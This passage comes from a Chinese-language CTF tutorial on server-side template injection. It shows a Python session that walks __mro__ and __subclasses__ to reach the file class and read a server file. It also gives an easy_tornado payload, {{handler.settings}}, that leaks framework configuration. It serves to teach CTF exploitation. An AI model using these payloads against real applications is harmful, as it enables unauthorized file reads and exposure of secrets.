<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span></code></pre>
回到object基类，就可以了，然后开始一层一层寻找要利用的函数
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span>
<span class="token comment">#使用一个for循环来list一下(方便查看和调用)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span> i
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span></code></pre>
使用file类中的open方法是第40
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/more.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'m0re is sixsixsix'</span></code></pre>
## CTF例题训练
ssti的题目，思路分析
### 查看配置文件
什么是查配置文件？我们都知道一个python框架，比如说flask，在框架中内置了一些全局变量，对象，函数等等。我们可以直接访问或是调用。
### easy_tornado
查看配置文件，在这里是tornado框架，配置文件在`handler.settings`
构造payload
<pre class="language-bash" data-language="bash"><code class="language-bash">error?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler.settings<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
